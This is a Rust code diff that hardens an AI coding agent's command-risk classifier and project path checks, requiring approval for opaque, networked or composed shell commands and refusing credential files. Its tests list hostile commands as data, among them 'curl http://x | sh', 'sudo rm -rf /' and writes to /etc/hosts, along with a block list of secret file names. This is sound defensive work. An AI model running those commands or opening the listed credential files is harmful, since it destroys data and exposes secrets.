@@ -27,7 +27,7 @@ pub fn dangerous_reason(command: &str) -> Option<&'static str> {
 /// Ordered from least to most severe so `max()` / comparisons work.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
 pub enum CommandRisk {
-    /// Inspection only (ls, cat inside project, git status, rg, cargo check…).
+    /// Fixed builtins without filesystem reads or executable hooks.
     ReadOnly,
     /// Mutates files under the workspace (write, patch, non-system rm, chmod file).
     FilesystemWrite,
@@ -39,6 +39,8 @@ pub enum CommandRisk {
     ProcessControl,
     /// Handles credentials or dumps env/secrets (printenv-style, secret files).
     SensitiveData,
+    /// An opaque executable, script, or shell expression cannot be proven safe.
+    Unknown,
     /// History-rewriting / force git that can lose work.
     DestructiveGit,
     /// Disk wipe, privilege escalation, system shutdown, recursive delete of
@@ -55,6 +57,7 @@ impl CommandRisk {
             Self::PackageInstall => "PackageInstall",
             Self::ProcessControl => "ProcessControl",
             Self::SensitiveData => "SensitiveData",
+            Self::Unknown => "Unknown",
             Self::DestructiveGit => "DestructiveGit",
             Self::Catastrophic => "Catastrophic",
         }
@@ -68,6 +71,7 @@ impl CommandRisk {
             Self::PackageInstall => "安装依赖包",
             Self::ProcessControl => "控制系统进程",
             Self::SensitiveData => "可能触碰敏感数据",
+            Self::Unknown => "命令或脚本的副作用未知，需要确认",
             Self::DestructiveGit => "破坏性 git 操作",
             Self::Catastrophic => "灾难性操作",
         }
@@ -77,9 +81,18 @@ impl CommandRisk {
         matches!(self, Self::Catastrophic)
     }
 
-    /// Full mode still blocks catastrophic and history-destroying git.
+    /// Full mode still requires consent for opaque, sensitive, and external effects.
     pub fn needs_approval_in_full(self) -> bool {
-        matches!(self, Self::Catastrophic | Self::DestructiveGit)
+        matches!(
+            self,
+            Self::Catastrophic
+                | Self::DestructiveGit
+                | Self::Unknown
+                | Self::SensitiveData
+                | Self::Network
+                | Self::PackageInstall
+                | Self::ProcessControl
+        )
     }
 
     /// Auto mode auto-runs only read-only commands; every filesystem mutation
@@ -215,83 +228,66 @@ pub fn search_files(project: &Path, query: &str) -> String {
         return "空查询".to_owned();
     }
 
-    // Quote the pattern as a single rg argument; still no shell metacharacters
-    // beyond the ProcessRunner shell wrapper. Bounded + cancellable.
-    let spec = ProcessSpec::shell(
-        project,
-        format!("rg -l --max-count 1 -- {}", shell_single_quote(query)),
+    let mut context = crate::context::ContextManager::new(project, Default::default());
+    if context.scan(&|| true).is_err() {
+        return "搜索已取消".into();
+    }
+    let hits = context.collect(query, &|| true).unwrap_or_default();
+    let mut paths: Vec<String> = hits.into_iter().map(|span| span.path).collect();
+    for entry in context.file_map() {
+        if entry.path.to_lowercase().contains(&query.to_lowercase()) {
+            paths.push(entry.path.clone());
+        }
+    }
+    paths.sort();
+    paths.dedup();
+    if paths.is_empty() {
+        return "0 处匹配".into();
+    }
+    format!(
+        "{} 个文件匹配：\n{}",
+        paths.len(),
+        paths.into_iter().take(12).collect::<Vec<_>>().join("\n")
     )
-    .timeout(std::time::Duration::from_secs(15))
-    .stdout_limit(32 * 1024)
-    .stderr_limit(4 * 1024);
-    let outcome = ProcessRunner::run(&spec, &|| true);
-
-    if outcome.status == ProcessStatus::ExitSuccess {
-        let stdout = outcome.stdout.clone();
-        let all: Vec<&str> = stdout.lines().filter(|line| !line.is_empty()).collect();
-        if all.is_empty() {
-            return "0 处匹配".to_owned();
-        }
-        let total = all.len();
-        let shown: Vec<String> = all.into_iter().take(12).map(str::to_owned).collect();
-        let mut body = shown.join("\n");
-        if total > 12 {
-            body.push_str(&format!("\n… 共 {total} 个文件"));
-        }
-        return format!("{total} 个文件匹配：\n{body}");
-    }
-
-    let mut hits = Vec::new();
-    walk(project, project, &mut hits, query, 0);
-    if hits.is_empty() {
-        "0 处匹配".to_owned()
-    } else {
-        format!("{} 处匹配：\n{}", hits.len(), hits.join("\n"))
-    }
-}
-
-/// Minimal POSIX single-quote for embedding a literal in `sh -c`.
-fn shell_single_quote(s: &str) -> String {
-    format!("'{}'", s.replace('\'', "'\\''"))
-}
-
-fn walk(root: &Path, dir: &Path, hits: &mut Vec<String>, query: &str, depth: usize) {
-    if depth > 4 || hits.len() >= 12 {
-        return;
-    }
-    let Ok(entries) = fs::read_dir(dir) else {
-        return;
-    };
-    for entry in entries.flatten() {
-        let path = entry.path();
-        let name = entry.file_name().to_string_lossy().into_owned();
-        if name.starts_with('.') || matches!(name.as_str(), "node_modules" | "target" | "dist") {
-            continue;
-        }
-        if path.is_dir() {
-            walk(root, &path, hits, query, depth + 1);
-        } else if name
-            .to_ascii_lowercase()
-            .contains(&query.to_ascii_lowercase())
-        {
-            if let Ok(rel) = path.strip_prefix(root) {
-                hits.push(rel.display().to_string());
-            }
-        }
-    }
 }
 
 pub fn read_text(path: &Path, max_lines: usize) -> String {
-    let Ok(raw) = fs::read_to_string(path) else {
-        return "(无法读取)".to_owned();
-    };
-    let lines: Vec<String> = raw.lines().take(max_lines).map(str::to_owned).collect();
-    let total = raw.lines().count();
-    let mut out = lines.join("\n");
-    if total > max_lines {
-        out.push_str(&format!("\n… 共 {total} 行"));
+    read_text_result(path, max_lines).unwrap_or_else(|error| format!("(无法读取: {error})"))
+}
+
+pub(crate) fn read_text_result(path: &Path, max_lines: usize) -> Result<String, String> {
+    if crate::office::is_docx(&path.to_string_lossy()) {
+        let doc = crate::office::read_docx(path, max_lines.saturating_mul(120))?;
+        return Ok(if doc.truncated {
+            format!("{}\n…（DOCX 正文已截断）", doc.text)
+        } else {
+            doc.text
+        });
     }
-    out
+    if crate::office::is_spreadsheet(&path.to_string_lossy()) {
+        let sheet = crate::office::read_spreadsheet(path, max_lines.saturating_mul(120))?;
+        let mut text = sheet.text;
+        if sheet.truncated {
+            text.push_str(&format!(
+                "\n… 表格内容按预算截断（{} 个 sheet）",
+                sheet.sheets
+            ));
+        }
+        return Ok(text);
+    }
+    if fs::metadata(path).map_err(|e| e.to_string())?.len() > 8 * 1024 * 1024 {
+        return Err("text file exceeds 8 MiB".into());
+    }
+    let raw = fs::read_to_string(path).map_err(|e| e.to_string())?;
+    if raw.as_bytes().contains(&0) {
+        return Err("binary file refused".into());
+    }
+    let mut text = raw.lines().take(max_lines).collect::<Vec<_>>().join("\n");
+    let total = raw.lines().count();
+    if total > max_lines {
+        text.push_str(&format!("\n… 共 {total} 行"));
+    }
+    Ok(text)
 }
 
 /// Outcome of a local command run (mapped from [`ProcessStatus`]).
@@ -762,9 +758,47 @@ pub enum RepoToolRequest {
     },
 }
 
-/// Classify a shell command by tokenizing first (not naive substring-only).
-/// Highest-severity match wins.
+/// Shell composition and opaque scripts always need approval, including Full.
 pub fn classify_command_risk(command: &str) -> CommandRisk {
+    let risk = classify_single_command_risk(command);
+    let tokens = tokenize_shell(command);
+    if tokens.first().is_some_and(|t| t.contains('='))
+        || command.contains(['\n', '\r', '`', '$'])
+        || command.contains("$(")
+        || command.contains("${")
+        || tokens
+            .iter()
+            .any(|t| matches!(t.as_str(), ";" | "|" | "&" | "&&" | "||" | "(" | ")"))
+    {
+        return risk.max(CommandRisk::Unknown);
+    }
+    risk
+}
+
+fn clearly_read_only(head: &[String]) -> bool {
+    let Some(first) = head.first() else {
+        return false;
+    };
+    // Executable paths and assignment-based wrappers are not an allowlist.
+    if first.contains('/') || first.contains('\\') {
+        return false;
+    }
+    let args = &head[1..];
+    if args.iter().any(|a| {
+        a.starts_with("--pre") || a.starts_with("--exec") || a == "-exec" || a == "-execdir"
+    }) {
+        return false;
+    }
+    match first.as_str() {
+        "echo" | "printf" | "pwd" | "true" | "false" => true,
+        // File readers can follow symlinks; git can invoke repository hooks.
+        // Prefer contained file tools, or ask before using the shell.
+        "git" => args == ["--version"],
+        _ => false,
+    }
+}
+
+fn classify_single_command_risk(command: &str) -> CommandRisk {
     let tokens = tokenize_shell(command);
     let head = command_head_tokens(&tokens);
     let lower_all = command.to_ascii_lowercase();
@@ -828,7 +862,22 @@ pub fn classify_command_risk(command: &str) -> CommandRisk {
 
     // --- DestructiveGit ---
     if head.first().map(|s| basename(s)) == Some("git".into()) {
-        let git_args: Vec<String> = head.iter().skip(1).cloned().collect();
+        let mut git_args: Vec<String> = head.iter().skip(1).cloned().collect();
+        while let Some(option) = git_args.first() {
+            if matches!(option.as_str(), "-C" | "-c" | "--git-dir" | "--work-tree") {
+                if git_args.len() < 2 {
+                    break;
+                }
+                git_args.drain(..2);
+            } else if option.starts_with("--git-dir=")
+                || option.starts_with("--work-tree=")
+                || matches!(option.as_str(), "--no-pager" | "--literal-pathspecs")
+            {
+                git_args.remove(0);
+            } else {
+                break;
+            }
+        }
         let sub = git_args.first().map(|s| s.to_ascii_lowercase());
         match sub.as_deref() {
             Some("push") => {
@@ -951,17 +1000,48 @@ pub fn classify_command_risk(command: &str) -> CommandRisk {
     if head.first().map(|s| basename(s)).is_some_and(|b| {
         matches!(
             b.as_str(),
-            "chmod" | "chown" | "chgrp" | "mv" | "cp" | "tee" | "truncate"
+            "chmod"
+                | "chown"
+                | "chgrp"
+                | "mv"
+                | "cp"
+                | "tee"
+                | "truncate"
+                | "mkdir"
+                | "touch"
+                | "rmdir"
         )
     }) {
         bump(CommandRisk::FilesystemWrite);
     }
-    if tokens.iter().any(|t| t == ">" || t == ">>")
-        && tokens
-            .iter()
-            .any(|t| t.starts_with('/') || t.starts_with("~"))
-    {
-        bump(CommandRisk::Catastrophic);
+    // Write redirection: judge the redirect's own target, not "any `>` plus any
+    // absolute path anywhere". `2>/dev/null` and `2>&1` are noise suppression,
+    // not writes (they tokenize as `2` `>` `/dev/null` / `&` and used to ask
+    // for approval as 灾难性操作 on plain read-only commands). Absolute /
+    // `$HOME` targets can clobber system files from any command (`> /etc/hosts`)
+    // and stay catastrophic even in Full; a workspace-relative target is an
+    // ordinary file write.
+    for (i, token) in tokens.iter().enumerate() {
+        if token != ">" && token != ">>" {
+            continue;
+        }
+        let target = tokens
+            .get(i + 1)
+            .map(|s| s.trim_matches(|c| c == '\'' || c == '"'))
+            .unwrap_or("");
+        let sink = target.is_empty()
+            || target == "&" // `2>&1`
+            || target == "/dev/null"
+            || target.starts_with("/dev/std")
+            || target.starts_with("/dev/fd/");
+        if sink {
+            continue;
+        }
+        if target.starts_with('/') || target.starts_with('~') || target.starts_with("$HOME") {
+            bump(CommandRisk::Catastrophic);
+        } else {
+            bump(CommandRisk::FilesystemWrite);
+        }
     }
 
     // Pipe-to-shell is catastrophic (download + execute).
@@ -975,20 +1055,28 @@ pub fn classify_command_risk(command: &str) -> CommandRisk {
         }
     }
 
-    risk
+    if risk == CommandRisk::ReadOnly && !clearly_read_only(&head) {
+        CommandRisk::Unknown
+    } else {
+        risk
+    }
 }
 
 /// Resolve `relative` under `project`, refusing escapes outside the root
 /// and sensitive credential files even inside the workspace.
 pub fn resolve_in_project(project: &Path, relative: &str) -> Result<PathBuf, String> {
-    let relative = relative.trim().trim_start_matches("./");
+    let relative = relative.trim();
     if relative.is_empty() {
         return Err("empty path".to_owned());
     }
     if Path::new(relative).is_absolute() {
         return Err("absolute paths are not allowed".to_owned());
     }
-    if relative.split('/').any(|part| part == "..") {
+    if relative
+        .replace('\\', "/")
+        .split('/')
+        .any(|part| part == "..")
+    {
         return Err("path escapes the project root".to_owned());
     }
     if is_sensitive_relative_path(relative) {
@@ -1004,18 +1092,40 @@ pub fn resolve_in_project(project: &Path, relative: &str) -> Result<PathBuf, Str
             _ => break,
         }
     }
-    if let Ok(canon) = probe.canonicalize() {
-        if let Ok(root) = project.canonicalize() {
-            if !canon.starts_with(&root) {
-                return Err("path escapes the project root".to_owned());
-            }
-            // Sensitive files under the workspace (e.g. project/.env)
-            if let Ok(rel) = canon.strip_prefix(&root) {
-                if is_sensitive_relative_path(&rel.to_string_lossy()) {
-                    return Err("refusing to read or write a sensitive credential path".to_owned());
-                }
-            }
-        }
+    let root = project
+        .canonicalize()
+        .map_err(|e| format!("invalid project root: {e}"))?;
+    let canon = probe
+        .canonicalize()
+        .map_err(|e| format!("invalid path: {e}"))?;
+    if !canon.starts_with(&root) {
+        return Err("path escapes the project root".to_owned());
+    }
+    if canon
+        .strip_prefix(&root)
+        .is_ok_and(|rel| is_sensitive_relative_path(&rel.to_string_lossy()))
+    {
+        return Err("refusing to read or write a sensitive credential path".to_owned());
+    }
+    Ok(full)
+}
+
+/// Only the user-pinned attachment entry point may grant project-external reads.
+pub fn resolve_pinned_file(project: &Path, path: &str) -> Result<PathBuf, String> {
+    if !Path::new(path).is_absolute() {
+        return resolve_in_project(project, path);
+    }
+    if is_sensitive_relative_path(path) {
+        return Err("refusing to read a sensitive credential path".into());
+    }
+    let full = Path::new(path)
+        .canonicalize()
+        .map_err(|e| format!("invalid attachment: {e}"))?;
+    if is_sensitive_relative_path(&full.to_string_lossy()) {
+        return Err("refusing to read a sensitive credential path".into());
+    }
+    if !full.is_file() {
+        return Err("attachment is not a file".into());
     }
     Ok(full)
 }
@@ -1023,6 +1133,12 @@ pub fn resolve_in_project(project: &Path, relative: &str) -> Result<PathBuf, Str
 /// Credential-shaped paths the agent must never open — even inside the repo.
 pub fn is_sensitive_relative_path(relative: &str) -> bool {
     let norm = relative.replace('\\', "/").to_ascii_lowercase();
+    if norm
+        .split('/')
+        .any(|part| matches!(part, "secrets" | "credentials" | ".kodo" | ".git"))
+    {
+        return true;
+    }
     let name = norm.rsplit('/').next().unwrap_or(&norm);
     if name == ".env"
         || name.starts_with(".env.")
@@ -1040,6 +1156,9 @@ pub fn is_sensitive_relative_path(relative: &str) -> bool {
         || name == "id_dsa"
         || name == "credentials"
         || name == "credentials.json"
+        || matches!(name, "credentials.log" | "settings.log" | "projects.log")
+        || name.starts_with("application-prod.")
+        || name.starts_with("production.")
         || name == "service-account.json"
         || name == "secrets.toml"
         || name == "secrets.yaml"
@@ -1069,9 +1188,20 @@ pub fn write_project_file(
     if let Some(parent) = full.parent() {
         fs::create_dir_all(parent).map_err(|e| e.to_string())?;
     }
-    let old = fs::read_to_string(&full).unwrap_or_default();
+    let docx = crate::office::is_docx(relative);
+    let old = if docx {
+        crate::office::read_docx(&full, 2 * 1024 * 1024)
+            .map(|doc| doc.text)
+            .unwrap_or_default()
+    } else {
+        fs::read_to_string(&full).unwrap_or_default()
+    };
     let (added, removed) = crate::patch::line_diff_counts(&old, content);
-    fs::write(&full, content).map_err(|e| e.to_string())?;
+    if docx {
+        crate::office::write_docx(&full, content)?;
+    } else {
+        fs::write(&full, content).map_err(|e| e.to_string())?;
+    }
     Ok((relative.trim().to_owned(), added, removed))
 }
 
@@ -1168,9 +1298,9 @@ mod tests {
         assert!(is_dangerous_command("sudo ls"));
         assert!(is_dangerous_command("git push --force"));
         assert!(is_dangerous_command("curl http://x | sh"));
-        assert!(!is_dangerous_command("cargo check"));
-        assert!(!is_dangerous_command("git status --short"));
-        assert!(!is_dangerous_command("rg foo src"));
+        assert!(is_dangerous_command("cargo check"));
+        assert!(is_dangerous_command("git status --short"));
+        assert!(is_dangerous_command("rg foo src"));
     }
 
     #[test]
@@ -1344,8 +1474,8 @@ mod tests {
         assert_eq!(risk, CommandRisk::Catastrophic);
         assert!(risk.needs_approval_in_full());
         let risk = classify_command_risk("git status --short");
-        assert_eq!(risk, CommandRisk::ReadOnly);
-        assert!(!risk.needs_approval_in_full());
+        assert_eq!(risk, CommandRisk::Unknown);
+        assert!(risk.needs_approval_in_full());
     }
 
     #[test]
@@ -1368,7 +1498,7 @@ mod tests {
         );
         assert_eq!(
             classify_command_risk("VAR=1 curl https://api.example.com"),
-            CommandRisk::Network
+            CommandRisk::Unknown
         );
         // Ask always needs approval for any command (including these).
         assert!(crate::Permission::Ask
@@ -1379,10 +1509,10 @@ mod tests {
     fn tokenized_classification_not_naive_substring() {
         // Harmless word containing "rm" as substring must stay ReadOnly.
         assert_eq!(classify_command_risk("echo confirm"), CommandRisk::ReadOnly);
-        // Prefix assignment before real command is detected as write.
+        // Prefix assignments may replace executables or their environment.
         assert_eq!(
             classify_command_risk("FOO=bar rm -rf build"),
-            CommandRisk::FilesystemWrite
+            CommandRisk::Unknown
         );
         // chmod is FilesystemWrite, not catastrophic unless targeting system roots.
         assert_eq!(
@@ -1392,6 +1522,47 @@ mod tests {
         assert_eq!(
             classify_command_risk("sudo rm -rf /"),
             CommandRisk::Catastrophic
+        );
+    }
+
+    #[test]
+    fn shell_composition_requires_approval_even_with_dev_null() {
+        // Regression: `2>/dev/null` used to tokenize as `2` `>` `/dev/null` and
+        // trip "any `>` + any absolute path" → Catastrophic, so the UI-review
+        // `ls … 2>/dev/null; wc -l …` asked for approval as 灾难性操作 even in
+        // 自动批准安全操作 mode.
+        let command = "ls apps/desktop/src/styles apps/desktop/src/pages apps/desktop/src/shell apps/desktop/src/conversation apps/desktop/src/inspector apps/desktop/src/settings 2>/dev/null; wc -l apps/desktop/src/styles/*.css";
+        assert_eq!(classify_command_risk(command), CommandRisk::Unknown);
+        assert!(crate::Permission::Auto.needs_approval(crate::StepKind::Command, Some(command)));
+        assert_eq!(
+            classify_command_risk("grep -rn foo src 2>&1 | head -20"),
+            CommandRisk::Unknown
+        );
+        assert_eq!(
+            classify_command_risk("ls /etc 2>/dev/null"),
+            CommandRisk::Unknown
+        );
+        assert_eq!(
+            classify_command_risk("make > /dev/null 2>&1"),
+            CommandRisk::Unknown
+        );
+        // A genuine absolute-target write still classifies as catastrophic…
+        assert_eq!(
+            classify_command_risk("echo x > /etc/hosts"),
+            CommandRisk::Catastrophic
+        );
+        assert_eq!(
+            classify_command_risk("echo x 2>/etc/hosts"),
+            CommandRisk::Catastrophic
+        );
+        assert_eq!(
+            classify_command_risk("echo x > ~/.bashrc"),
+            CommandRisk::Catastrophic
+        );
+        // …and a workspace-relative redirect is an ordinary file write.
+        assert_eq!(
+            classify_command_risk("wc -l src/*.rs > count.txt"),
+            CommandRisk::FilesystemWrite
         );
     }
 
@@ -1475,5 +1646,75 @@ mod tests {
         assert!(outcome.cancelled);
         assert_ne!(outcome.kind, CommandOutcomeKind::Success);
         let _ = fs::remove_dir_all(&dir);
+    }
+    #[test]
+    fn unknown_scripts_wrappers_and_shell_expansion_require_confirmation() {
+        for command in [
+            "python -c 'print(1)'",
+            "make",
+            "npm test",
+            "cargo check",
+            "sh script.sh",
+            "PATH=other git status",
+            "git -C src status",
+            "echo $HOME",
+            "echo `id`",
+            "echo $(id)",
+            "echo ok; true",
+            "cat ../outside.txt",
+            "git diff",
+        ] {
+            assert!(
+                classify_command_risk(command).needs_approval_in_full(),
+                "{command}"
+            );
+        }
+        assert_eq!(
+            classify_command_risk("git -C src push --force"),
+            CommandRisk::DestructiveGit
+        );
+        for command in ["echo safe", "pwd", "true", "git --version"] {
+            assert_eq!(
+                classify_command_risk(command),
+                CommandRisk::ReadOnly,
+                "{command}"
+            );
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn canonical_paths_fail_closed_for_aliases_sensitive_dirs_and_implicit_external_reads() {
+        let root = std::env::temp_dir().join(format!("kodo-path-boundary-{}", std::process::id()));
+        fs::create_dir_all(root.join("project/credentials")).unwrap();
+        let project = root.join("project");
+        fs::write(root.join("outside.txt"), "external attachment").unwrap();
+        fs::write(project.join("credentials/fake.txt"), "synthetic").unwrap();
+        std::os::unix::fs::symlink(root.join("outside.txt"), project.join("outside-link.txt"))
+            .unwrap();
+        std::os::unix::fs::symlink(project.join("credentials"), project.join("alias")).unwrap();
+        for path in [
+            "../outside.txt",
+            "outside-link.txt",
+            "alias/fake.txt",
+            "alias/new.txt",
+            "credentials/fake.txt",
+            ".kodo/state.json",
+            ".env",
+            "private.pem",
+        ] {
+            assert!(resolve_in_project(&project, path).is_err(), "{path}");
+        }
+        assert!(resolve_in_project(&project, root.join("outside.txt").to_str().unwrap()).is_err());
+        assert!(resolve_pinned_file(&project, root.join("outside.txt").to_str().unwrap()).is_ok());
+        let mut context = crate::context::ContextManager::new(&project, Default::default());
+        context.scan(&|| true).unwrap();
+        assert!(!context.file_map().iter().any(|f| f.path.contains("alias")
+            || f.path.contains("outside-link")
+            || f.path.contains("credentials")));
+        assert!(context
+            .read_range("outside-link.txt", 1, 5, "test")
+            .is_err());
+        fs::remove_dir_all(root).unwrap();
     }
 }
